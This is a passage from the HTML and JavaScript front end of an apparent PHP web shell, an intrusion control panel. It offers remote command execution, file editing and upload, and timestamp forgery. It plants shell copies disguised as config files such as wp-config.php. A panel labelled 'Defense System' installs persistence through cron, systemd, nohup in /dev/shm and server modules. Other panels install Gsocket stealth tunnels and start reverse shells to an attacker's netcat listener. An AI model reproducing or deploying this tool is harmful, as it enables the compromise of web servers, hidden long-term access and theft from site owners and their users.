            <div class="form-group">
                <label class="form-label">Search Path</label>
                <input type="text" id="base-path" class="form-control" value="/var/www/html" placeholder="/path/to/search">
            </div>
            
            <div class="form-group">
                <label class="form-label">Shell Filenames (comma separated)</label>
                <textarea id="shell-filenames" class="form-control" rows="3" placeholder="config.php,index.php,wp-config.php">config.php,wp-config.php,settings.php</textarea>
            </div>
            
            <div class="form-group">
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                    <input type="checkbox" id="create-htaccess" checked style="width: auto;">
                    <span>Create .htaccess protection</span>
                </label>
            </div>
            
            <div class="path-actions">
                <button class="btn btn-primary" onclick="findWritablePaths()">Scan Writable Paths</button>
                <button class="btn btn-danger" onclick="deployShell()" style="display: none;" id="deploy-btn">Deploy Shells</button>
            </div>
            
            <div id="deploy-results" style="display: none; margin-top: 20px;">
                <h3 style="margin-bottom: 10px; color: var(--text-primary); font-size: 14px;">Found Paths:</h3>
                <div id="paths-list" style="max-height: 200px; overflow-y: auto; background: var(--bg-tertiary); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color);"></div>
            </div>
            
            <div id="deploy-output" style="display: none; margin-top: 20px;"></div>
        </section>
        
        <!-- Defense Section -->
        <section id="defense" class="content-section">
            <h2 class="section-title">Defense System</h2>
            <div class="alert alert-info">
                Install persistence mechanisms to maintain shell access across different server types
            </div>
            
            <div class="tools-grid">
                <div class="tool-card" onclick="installDefense('nohup')">
                    <div class="tool-title">Nohup Persistence</div>
                    <div class="tool-desc">Continuous background process with stealthy locations (/dev/shm, /run/lock)</div>
                </div>
                
                <div class="tool-card" onclick="installDefense('cron')">
                    <div class="tool-title">Cron Job</div>
                    <div class="tool-desc">Scheduled execution via crontab, system cron, or cron directories</div>
                </div>
                
                <div class="tool-card" onclick="installDefense('systemd')">
                    <div class="tool-title">Systemd Service</div>
                    <div class="tool-desc">Install as a system service with automatic restart (Linux systems)</div>
                </div>
                
                <div class="tool-card" onclick="installDefense('inittab')">
                    <div class="tool-title">Inittab Entry</div>
                    <div class="tool-desc">Persist through init system (legacy systems)</div>
                </div>
                
                <div class="tool-card" onclick="installDefense('apache')">
                    <div class="tool-title">Apache Module</div>
                    <div class="tool-desc">Install as Apache module or .so file</div>
                </div>
                
                <div class="tool-card" onclick="installDefense('nginx')">
                    <div class="tool-title">Nginx Module</div>
                    <div class="tool-desc">Add to Nginx configuration files</div>
                </div>
                
                <div class="tool-card" onclick="installDefense('windows')">
                    <div class="tool-title">Windows Startup</div>
                    <div class="tool-desc">Add to Windows startup or scheduled tasks</div>
                </div>
                
                <div class="tool-card" onclick="installDefense('litespeed')">
                    <div class="tool-title">LiteSpeed Module</div>
                    <div class="tool-desc">Integrate with LiteSpeed cache system</div>
                </div>
                
                <div class="tool-card" onclick="checkDefense()">
                    <div class="tool-title">Check Status</div>
                    <div class="tool-desc">Verify active defense mechanisms</div>
                </div>
            </div>
            
            <div id="defense-output" style="margin-top: 20px; display: none;"></div>
        </section>
        
        <!-- Gsocket Section -->
        <section id="gsocket" class="content-section">
            <h2 class="section-title">Install Gsocket</h2>
            <div class="alert alert-success">
                Gsocket will be installed to /dev/shm/.gs for stealth. Provides encrypted reverse shell tunnels.
            </div>
            <button class="btn btn-primary" onclick="installGsocket()" style="margin-top: 20px;">Install Gsocket</button>
            <div class="terminal-output" id="gsocket-output" style="margin-top: 20px; height: 300px; display: none;"></div>
        </section>
        
        <!-- Reverse Shell Section -->
        <section id="reverse" class="content-section">
            <h2 class="section-title">Reverse Shell</h2>
            <div class="alert alert-info">
                Connect back to your listener. Start netcat on your machine first: <code>nc -lvnp 4444</code>
            </div>
            
            <div class="form-group">
                <label class="form-label">Connection Method</label>
                <select id="backconnect-method" class="form-control">
                    <option value="php">PHP</option>
                    <option value="bash">Bash</option>
                    <option value="python">Python</option>
                    <option value="python3">Python3</option>
                    <option value="nc">Netcat</option>
                    <option value="perl">Perl</option>
                    <option value="ruby">Ruby</option>
                </select>
            </div>
            
            <div class="form-group">
                <label class="form-label">Your IP Address</label>
                <input type="text" id="backconnect-ip" class="form-control" placeholder="10.0.0.1" value="<?= $_SERVER['REMOTE_ADDR'] ?? '' ?>">
            </div>
            
            <div class="form-group">
                <label class="form-label">Port</label>
                <input type="text" id="backconnect-port" class="form-control" value="4444">
            </div>
            
            <button class="btn btn-danger" onclick="startBackconnect()">Start Reverse Shell</button>
        </section>
        
        <!-- Port Check Section -->
        <section id="portcheck" class="content-section">
            <h2 class="section-title">Port Checker</h2>
            <button class="btn btn-primary" onclick="checkPorts()">Scan Open Ports</button>
            <div class="terminal-output" id="portcheck-output" style="margin-top: 20px; height: 300px; display: none;"></div>
        </section>
        
        <!-- Find Backdoors Section -->
        <section id="findbackdoor" class="content-section">
            <h2 class="section-title">Find Shell Backdoors</h2>
            <div class="alert alert-warning">
                Search for other backdoors in the system using advanced pattern matching
            </div>
            
            <div class="form-group">
                <label class="form-label">Search Path</label>
                <input type="text" id="search-path" class="form-control" value="/var/www" placeholder="/path/to/search">
            </div>
            
            <div class="form-group">
                <label class="form-label">Max Depth</label>
                <input type="number" id="search-depth" class="form-control" value="4" min="1" max="10">
            </div>
            
            <button class="btn btn-primary" onclick="findBackdoors()">Search for Backdoors</button>
            
            <div id="backdoor-results" style="margin-top: 20px; display: none;">
                <h3 style="margin-bottom: 10px; color: var(--text-primary);">Found Backdoors: <span id="backdoor-count">0</span></h3>
                <div id="backdoor-list" style="max-height: 400px; overflow-y: auto;"></div>
            </div>
        </section>
        
        <!-- Modals -->
        <div class="modal" id="edit-file-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Edit File</div>
                    <button class="modal-close" onclick="hideModal('edit-file-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">Path</label>
                    <input type="text" id="edit-file-path" class="form-control" readonly>
                </div>
                <div class="form-group">
                    <label class="form-label">Content</label>
                    <textarea id="edit-file-content" class="form-control" spellcheck="false" rows="20"></textarea>
                </div>
                <div class="create-buttons">
                    <button class="btn btn-success" onclick="saveFile()">Save Changes</button>
                    <button class="btn btn-primary" onclick="previewFile()">Preview</button>
                </div>
                <div id="file-preview" class="file-preview" style="display: none;"></div>
            </div>
        </div>
        
        <div class="modal" id="rename-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Rename Item</div>
                    <button class="modal-close" onclick="hideModal('rename-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">Current Path</label>
                    <input type="text" id="rename-old-path" class="form-control" readonly>
                </div>
                <div class="form-group">
                    <label class="form-label">New Name</label>
                    <input type="text" id="rename-new-name" class="form-control" autocomplete="off">
                </div>
                <button class="btn btn-success" onclick="performRename()">Rename</button>
            </div>
        </div>
        
        <div class="modal" id="chmod-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Change Permissions</div>
                    <button class="modal-close" onclick="hideModal('chmod-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">Path</label>
                    <input type="text" id="chmod-path" class="form-control" readonly>
                </div>
                <div class="form-group">
                    <label class="form-label">Permissions (octal)</label>
                    <input type="text" id="chmod-mode" class="form-control" value="0644" placeholder="e.g., 0755">
                </div>
                <div class="alert alert-info">
                    Common permissions: 0644 (file), 0755 (directory), 0777 (full access)
                </div>
                <button class="btn btn-success" onclick="performChmod()">Apply</button>
            </div>
        </div>
        
        <div class="modal" id="chdate-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Change Timestamp</div>
                    <button class="modal-close" onclick="hideModal('chdate-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">Path</label>
                    <input type="text" id="chdate-path" class="form-control" readonly>
                </div>
                <div class="form-group">
                    <label class="form-label">New Timestamp</label>
                    <div class="chdate-input">
                        <input type="text" id="chdate-timestamp" class="form-control" value="<?= date('Y-m-d H:i:s') ?>" placeholder="YYYY-MM-DD HH:MM:SS">
                        <button class="chdate-now" onclick="document.getElementById('chdate-timestamp').value = '<?= date('Y-m-d H:i:s') ?>'">Now</button>
                    </div>
                </div>
                <div class="alert alert-info">
                    Format: YYYY-MM-DD HH:MM:SS (e.g., <?= date('Y-m-d H:i:s') ?>)
                </div>
                <button class="btn btn-success" onclick="performChdate()">Change Timestamp</button>
            </div>
        </div>
        
        <div class="modal" id="upload-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Upload File</div>
                    <button class="modal-close" onclick="hideModal('upload-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">Select File</label>
                    <div class="custom-file-input">
                        <input type="file" id="modal-file-upload" onchange="updateFileName(this)">
                        <div class="custom-file-label" id="file-upload-label">Choose file...</div>
                        <div class="custom-file-name" id="file-name-display"></div>
                    </div>
                </div>
                <div class="form-group">
                    <label class="form-label">Destination Path</label>
                    <input type="text" id="upload-dest-path" class="form-control" value="<?= htmlspecialchars($CURRENT_DIR) ?>/" readonly>
                </div>
                <button class="btn btn-success" onclick="performUpload()">Upload File</button>
            </div>
        </div>
        
        <!-- Create File Modal -->
        <div class="modal" id="create-file-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Create New File</div>
                    <button class="modal-close" onclick="hideModal('create-file-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">Filename</label>
                    <input type="text" id="create-filename" class="form-control" placeholder="newfile.php">
                </div>
                <div class="form-group">
                    <label class="form-label">Content</label>
                    <textarea id="create-file-content" class="form-control" rows="10" placeholder="File content..."></textarea>
                </div>
                <button class="btn btn-success" onclick="createNewFile()">Create File</button>
            </div>
        </div>
        
        <!-- Create Folder Modal -->
        <div class="modal" id="create-folder-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Create New Folder</div>
                    <button class="modal-close" onclick="hideModal('create-folder-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">Folder Name</label>
                    <input type="text" id="create-foldername" class="form-control" placeholder="newfolder">
                </div>
                <button class="btn btn-success" onclick="createNewFolder()">Create Folder</button>
            </div>
        </div>
    </div>
    
    <script>
        let currentDirectory = '<?= addslashes($directory_contents['current_path']) ?>';
        let selectedPaths = [];
        
        // Navigation tabs
        document.querySelectorAll('.nav-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
                document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
                
                btn.classList.add('active');
                document.getElementById(btn.dataset.section).classList.add('active');
                
                if (btn.dataset.section === 'terminal') {
                    setTimeout(() => document.getElementById('terminal-command').focus(), 100);
                }
            });
        });
        
        // Terminal input handler
        document.getElementById('terminal-command').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                executeTerminalCommand();
            }
        });
        
        // Helper functions
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function showAlert(message, type = 'info', duration = 5000) {
            const alert = document.getElementById('global-alert');
            alert.textContent = message;
            alert.className = `alert alert-${type}`;
            alert.style.display = 'block';
            
            setTimeout(() => {
                alert.style.display = 'none';
            }, duration);
        }
        
        // File manager functions
        function loadDirectory(path = null) {
            if (!path) path = currentDirectory;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=change_dir&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success && data.redirect) {
                    window.location.href = data.redirect;
                } else {
                    showAlert('Failed to change directory', 'error');
                }
            });
        }
        
        function editFile(path) {
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=read_file&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('edit-file-path').value = path;
                    document.getElementById('edit-file-content').value = data.content;
                    document.getElementById('file-preview').style.display = 'none';
                    showModal('edit-file-modal');
                    setTimeout(() => document.getElementById('edit-file-content').focus(), 100);
                } else {
                    showAlert('Cannot read file: ' + data.message, 'error');
                }
            });
        }
        
        function viewFile(path) {
            const encodedPath = btoa(path);
            window.open(`?auth=<?= $AUTH_KEY ?>&view=1&path=${encodedPath}`, '_blank');
        }
        
        function previewFile() {
            const content = document.getElementById('edit-file-content').value;
            const preview = document.getElementById('file-preview');
            preview.textContent = content;
            preview.style.display = 'block';
        }
        
        function saveFile() {
            const path = document.getElementById('edit-file-path').value;
            const content = document.getElementById('edit-file-content').value;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=write_file&path=' + encodeURIComponent(path) + '&content=' + encodeURIComponent(content)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('edit-file-modal');
                    showAlert('✓ File saved successfully', 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('✗ Save failed: ' + data.message, 'error');
                }
            });
        }
        
        function deleteItem(path) {
            if (!confirm('Are you sure you want to delete this item?')) return;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=delete&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showAlert('✓ Item deleted successfully', 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('✗ Delete failed: ' + data.message, 'error');
                }
            });
        }
        
        function renameItem(path) {
            document.getElementById('rename-old-path').value = path;
            const parts = path.split('/');
            document.getElementById('rename-new-name').value = parts[parts.length - 1];
            showModal('rename-modal');
            setTimeout(() => document.getElementById('rename-new-name').focus(), 100);
        }
        
        function performRename() {
            const oldPath = document.getElementById('rename-old-path').value;
            const newName = document.getElementById('rename-new-name').value.trim();
            
            if (!newName) {
                showAlert('Please enter a new name', 'error');
                return;
            }
            
            const newPath = oldPath.substring(0, oldPath.lastIndexOf('/')) + '/' + newName;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=rename&old_path=' + encodeURIComponent(oldPath) + '&new_path=' + encodeURIComponent(newPath)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('rename-modal');
                    showAlert('✓ Item renamed successfully', 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('✗ Rename failed: ' + data.message, 'error');
                }
            });
        }
        
        function chmodItem(path) {
            document.getElementById('chmod-path').value = path;
            showModal('chmod-modal');
            setTimeout(() => document.getElementById('chmod-mode').focus(), 100);
        }
        
        function performChmod() {
            const path = document.getElementById('chmod-path').value;
            const mode = document.getElementById('chmod-mode').value.trim();
            
            if (!/^[0-7]{3,4}$/.test(mode)) {
                showAlert('Invalid permissions format. Use octal like 0644 or 0755', 'error');
                return;
            }
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=chmod&path=' + encodeURIComponent(path) + '&mode=' + encodeURIComponent(mode)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('chmod-modal');
                    showAlert('✓ Permissions changed to ' + mode, 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('✗ Failed: ' + data.message, 'error');
                }
            });
        }
        
        function chdateItem(path) {
            document.getElementById('chdate-path').value = path;
            showModal('chdate-modal');
            setTimeout(() => document.getElementById('chdate-timestamp').focus(), 100);
        }
        
        function performChdate() {
            const path = document.getElementById('chdate-path').value;
            const timestamp = document.getElementById('chdate-timestamp').value.trim();
            
            if (!timestamp) {
                showAlert('Please enter a timestamp', 'error');
                return;
            }
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=chdate&path=' + encodeURIComponent(path) + '&timestamp=' + encodeURIComponent(timestamp)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('chdate-modal');
                    showAlert('✓ ' + data.message, 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('✗ Failed: ' + data.message, 'error');
                }
            });
        }
        
        // Upload functions
        function showUploadModal() {
            document.getElementById('upload-dest-path').value = currentDirectory + '/';
            document.getElementById('modal-file-upload').value = '';
            document.getElementById('file-name-display').textContent = '';
            document.getElementById('file-upload-label').textContent = 'Choose file...';
            showModal('upload-modal');
        }
        
        function updateFileName(input) {
            if (input.files.length > 0) {
                const fileName = input.files[0].name;
                document.getElementById('file-name-display').textContent = 'Selected: ' + fileName;
                document.getElementById('file-upload-label').textContent = 'Change file...';
                
                // Update destination path
                const destPath = document.getElementById('upload-dest-path');
                destPath.value = currentDirectory + '/' + fileName;
            }
        }
        
        function performUpload() {
            const fileInput = document.getElementById('modal-file-upload');
            const destPath = document.getElementById('upload-dest-path').value;
            
            if (!fileInput.files.length) {
                showAlert('Please select a file', 'error');
                return;
            }
            
            const formData = new FormData();
            formData.append('action', 'upload');
            formData.append('dest_path', destPath);
            formData.append('file', fileInput.files[0]);
            
            fetch('', { method: 'POST', body: formData })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('upload-modal');
                    showAlert('✓ File uploaded successfully', 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('✗ Upload failed: ' + data.message, 'error');
                }
            });
        }
        
        // Create file/folder functions
        function showCreateFileModal() {
            document.getElementById('create-filename').value = '';
            document.getElementById('create-file-content').value = '';
            showModal('create-file-modal');
            setTimeout(() => document.getElementById('create-filename').focus(), 100);
        }
        
        function showCreateFolderModal() {
            document.getElementById('create-foldername').value = '';
            showModal('create-folder-modal');
            setTimeout(() => document.getElementById('create-foldername').focus(), 100);
        }
        
        function createNewFile() {
            const filename = document.getElementById('create-filename').value.trim();
            const content = document.getElementById('create-file-content').value;
            
            if (!filename) {
                showAlert('Please enter a filename', 'error');
                return;
            }
            
            const path = currentDirectory + '/' + filename;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=create_file&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    if (content) {
                        fetch('', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: 'action=write_file&path=' + encodeURIComponent(path) + '&content=' + encodeURIComponent(content)
                        })
                        .then(response => response.json())
                        .then(writeData => {
                            hideModal('create-file-modal');
                            if (writeData.success) {
                                showAlert('✓ File created and content written', 'success');
                                setTimeout(() => location.reload(), 1000);
                            } else {
                                showAlert('File created but content not written', 'warning');
                                setTimeout(() => location.reload(), 1000);
                            }
                        });
                    } else {
                        hideModal('create-file-modal');
                        showAlert('✓ File created successfully', 'success');
                        setTimeout(() => location.reload(), 1000);
                    }
                } else {
                    showAlert('✗ Failed: ' + data.message, 'error');
                }
            });
        }
        
        function createNewFolder() {
            const foldername = document.getElementById('create-foldername').value.trim();
            
            if (!foldername) {
                showAlert('Please enter a folder name', 'error');
                return;
            }
            
            const path = currentDirectory + '/' + foldername;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=create_dir&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('create-folder-modal');
                    showAlert('✓ Folder created successfully', 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('✗ Failed: ' + data.message, 'error');
                }
            });
        }
        
        // Terminal functions
        function executeTerminalCommand(background = false) {
            const command = document.getElementById('terminal-command').value.trim();
            if (!command) return;
            
            const output = document.getElementById('terminal-output');
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.innerHTML = `<span class="prompt">$</span> <span class="command">${escapeHtml(command)}</span>`;
            output.appendChild(line);
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=execute_command&command=' + encodeURIComponent(command) + '&background=' + (background ? '1' : '0')
            })
            .then(response => response.json())
            .then(data => {
                const outputDiv = document.createElement('div');
                outputDiv.className = 'output';
                outputDiv.textContent = data.output || '(no output)';
                line.appendChild(outputDiv);
                
                output.scrollTop = output.scrollHeight;
                document.getElementById('terminal-command').value = '';
                
                if (background) {
                    showAlert('✓ Command running in background', 'success');
                }
            });
        }
        
        // Backconnect function
        function startBackconnect() {
            const method = document.getElementById('backconnect-method').value;
            const ip = document.getElementById('backconnect-ip').value.trim();
            const port = document.getElementById('backconnect-port').value.trim();
            
            if (!ip || !port) {
                showAlert('Please enter IP and port', 'error');
                return;
            }
            
            if (!/^\d+$/.test(port) || port < 1 || port > 65535) {
                showAlert('Port must be between 1 and 65535', 'error');
                return;
            }
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=backconnect&method=' + encodeURIComponent(method) + '&ip=' + encodeURIComponent(ip) + '&port=' + encodeURIComponent(port)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showAlert('✓ Reverse shell initiated. Check your listener!', 'success');
                } else {
                    showAlert('✗ Backconnect failed: ' + data.message, 'error');
                }
            });
        }
        
        // Deploy functions
        function findWritablePaths() {
            const basePath = document.getElementById('base-path').value.trim();
            
            if (!basePath) {
                showAlert('Please enter a search path', 'error');
                return;
            }
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=deploy&base_path=' + encodeURIComponent(basePath)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success && data.paths && data.paths.length > 0) {
                    selectedPaths = data.paths;
                    
                    let html = '';
                    data.paths.forEach(path => {
                        html += `<div style="margin-bottom: 8px; padding: 8px; background: var(--bg-secondary); border-radius: 6px; border: 1px solid var(--border-color);">
                            <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                                <input type="checkbox" class="path-checkbox" value="${path}" checked style="width: auto;">
                                <span style="font-family: 'JetBrains Mono', monospace; font-size: 12px;">${path}</span>
                            </label>
                        </div>`;
                    });
                    
                    document.getElementById('paths-list').innerHTML = html;
                    document.getElementById('deploy-results').style.display = 'block';
                    document.getElementById('deploy-btn').style.display = 'inline-block';
                    showAlert(`Found ${data.paths.length} writable paths`, 'success');
                } else {
                    showAlert('No writable paths found', 'error');
                }
            });
        }
        
        function deployShell() {
            const checkboxes = document.querySelectorAll('.path-checkbox:checked');
            if (checkboxes.length === 0) {
                showAlert('Please select at least one path', 'error');
                return;
            }
            
            const filenames = document.getElementById('shell-filenames').value.trim();
            const createHtaccess = document.getElementById('create-htaccess').checked;
            
            if (!filenames) {
                showAlert('Please enter filenames', 'error');
                return;
            }
            
            const outputDiv = document.getElementById('deploy-output');
            outputDiv.style.display = 'block';
            outputDiv.innerHTML = '<h3 style="margin-bottom: 10px;">Deployment Results:</h3>';
            
            let totalDeployed = 0;
            let totalFailed = 0;
            
            checkboxes.forEach(checkbox => {
                const path = checkbox.value;
                
                fetch('', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'action=deploy_shell&target_path=' + encodeURIComponent(path) + 
                          '&filenames=' + encodeURIComponent(filenames) + 
                          '&create_htaccess=' + (createHtaccess ? '1' : '0')
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success && data.results) {
                        data.results.forEach(result => {
                            const resultDiv = document.createElement('div');
                            resultDiv.className = 'result-item ' + (result.success ? 'result-success' : 'result-error');
                            resultDiv.innerHTML = `
                                <strong>${result.filename}</strong> in ${path}<br>
                                Status: ${result.success ? '✓ SUCCESS' : '✗ FAILED'} ${result.error ? '- ' + result.error : ''}<br>
                                ${result.timestamp_matched ? 'Timestamp matched ✓' : ''}
                                ${result.htaccess ? 'HTAccess created ✓' : ''}
                            `;
                            outputDiv.appendChild(resultDiv);
                            
                            if (result.success) {
                                totalDeployed++;
                                checkbox.parentElement.style.backgroundColor = 'rgba(16, 185, 129, 0.2)';
                            } else {
                                totalFailed++;
                                checkbox.parentElement.style.backgroundColor = 'rgba(239, 68, 68, 0.2)';
                            }
                        });
                        
                        if (totalDeployed + totalFailed === checkboxes.length * filenames.split(',').length) {
                            showAlert(`Deployment complete: ${totalDeployed} successful, ${totalFailed} failed`, 
                                     totalFailed === 0 ? 'success' : 'error');
                        }
                    }
                });
            });
        }
        
        // Gsocket function
        function installGsocket() {
            if (!confirm('Install Gsocket to /dev/shm/.gs?')) return;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=install_gsocket'
            })
            .then(response => response.json())
            .then(data => {
                const output = document.getElementById('gsocket-output');
                output.style.display = 'block';
                output.innerHTML = '';
                
                const line = document.createElement('div');
                line.className = 'terminal-line';
                line.innerHTML = `<span class="prompt">$</span> <span class="command">Installing Gsocket...</span>`;
                output.appendChild(line);
                
                const outputDiv = document.createElement('div');
                outputDiv.className = 'output';
                outputDiv.textContent = data.output || data.error || 'No output';
                line.appendChild(outputDiv);
                
                output.scrollTop = output.scrollHeight;
                
                if (data.success) {
                    showAlert('✓ Gsocket installed successfully', 'success');
                } else {
                    showAlert('✗ Gsocket installation failed', 'error');
                }
            });
        }
        
        // Port check function
        function checkPorts() {
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=port_check'
            })
            .then(response => response.json())
            .then(data => {
                const output = document.getElementById('portcheck-output');
                output.style.display = 'block';
                output.innerHTML = '';
                
                const line = document.createElement('div');
                line.className = 'terminal-line';
                line.innerHTML = `<span class="prompt">$</span> <span class="command">netstat -tulpn</span>`;
                output.appendChild(line);
                
                const outputDiv = document.createElement('div');
                outputDiv.className = 'output';
                outputDiv.textContent = data.output || 'No output';
                line.appendChild(outputDiv);
                
                output.scrollTop = output.scrollHeight;
            });
        }
        
        // Find backdoors function
        function findBackdoors() {
            const path = document.getElementById('search-path').value.trim();
            const depth = document.getElementById('search-depth').value;
            
            if (!path) {
                showAlert('Please enter a search path', 'error');
                return;
            }
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=find_backdoors&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                const resultsDiv = document.getElementById('backdoor-results');
                const listDiv = document.getElementById('backdoor-list');
                const countSpan = document.getElementById('backdoor-count');
                
                if (data.success && data.backdoors && data.backdoors.length > 0) {
                    countSpan.textContent = data.count;
                    listDiv.innerHTML = '';
                    
                    data.backdoors.forEach(backdoor => {
                        const item = document.createElement('div');
                        item.className = 'backdoor-item';
                        item.innerHTML = `
                            <div class="backdoor-path">${backdoor.path}</div>
                            <div class="backdoor-info">
                                Size: ${backdoor.size} | Modified: ${backdoor.modified}
                            </div>
                        `;
                        listDiv.appendChild(item);
                    });
                    
                    resultsDiv.style.display = 'block';
                    showAlert(`Found ${data.count} potential backdoors`, 'success');
                } else {
                    countSpan.textContent = '0';
                    listDiv.innerHTML = '<div class="alert alert-info">No backdoors found</div>';
                    resultsDiv.style.display = 'block';
                    showAlert('No backdoors found', 'info');
                }
            });
        }
        
        // Defense functions
        function installDefense(type) {
            const defenseNames = {
                'nohup': 'Nohup Persistence',
                'cron': 'Cron Job',
                'systemd': 'Systemd Service',
                'inittab': 'Inittab Entry',
                'apache': 'Apache Module',
                'nginx': 'Nginx Module',
                'windows': 'Windows Startup',
                'litespeed': 'LiteSpeed Module'
            };
            
            if (!confirm(`Install ${defenseNames[type]} defense?`)) return;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=install_defense&defense_type=' + encodeURIComponent(type)
            })
            .then(response => response.json())
            .then(data => {
                const outputDiv = document.getElementById('defense-output');
                outputDiv.style.display = 'block';
                
                if (data.success) {
                    outputDiv.innerHTML = `
                        <div class="alert alert-success">
                            ✓ ${data.message || 'Defense installed successfully'}<br>
                            ${data.pid ? 'PID: ' + data.pid + '<br>' : ''}
                            ${data.script_path ? 'Script: ' + data.script_path + '<br>' : ''}
                            ${data.service_file ? 'Service: ' + data.service_file + '<br>' : ''}
                            ${data.service_name ? 'Service Name: ' + data.service_name + '<br>' : ''}
                            ${data.module_path ? 'Module: ' + data.module_path + '<br>' : ''}
                            ${data.config_path ? 'Config: ' + data.config_path + '<br>' : ''}
                            ${data.batch_path ? 'Batch: ' + data.batch_path + '<br>' : ''}
                            ${data.location ? 'Location: ' + data.location + '<br>' : ''}
                        </div>
                    `;
                    showAlert(`✓ ${defenseNames[type]} installed successfully`, 'success');
                } else {
                    outputDiv.innerHTML = `
                        <div class="alert alert-error">
                            ✗ ${data.error || 'Defense installation failed'}
                        </div>
                    `;
                    showAlert(`✗ ${defenseNames[type]} installation failed: ${data.error}`, 'error');
                }
            });
        }
        
        function checkDefense() {
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=check_defense'
            })
            .then(response => response.json())
            .then(data => {
                const outputDiv = document.getElementById('defense-output');
                outputDiv.style.display = 'block';
                
                let html = '<h3 style="margin-bottom: 10px;">Defense Status:</h3>';
                for (const [type, status] of Object.entries(data.results)) {
                    html += `
                        <div class="result-item ${status ? 'result-success' : 'result-error'}">
                            <strong>${type.toUpperCase()}</strong>: ${status ? '✓ ACTIVE' : '✗ INACTIVE'}
                        </div>
                    `;
                }
                outputDiv.innerHTML = html;
            });
        }
        
        // Modal functions
        function showModal(modalId) {
            document.getElementById(modalId).classList.add('active');
        }
        
        function hideModal(modalId) {
            document.getElementById(modalId).classList.remove('active');
        }
        
        // Global event listeners
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                document.querySelectorAll('.modal.active').forEach(modal => {
                    modal.classList.remove('active');
                });
            }
        });
    </script>
</body>
</html>
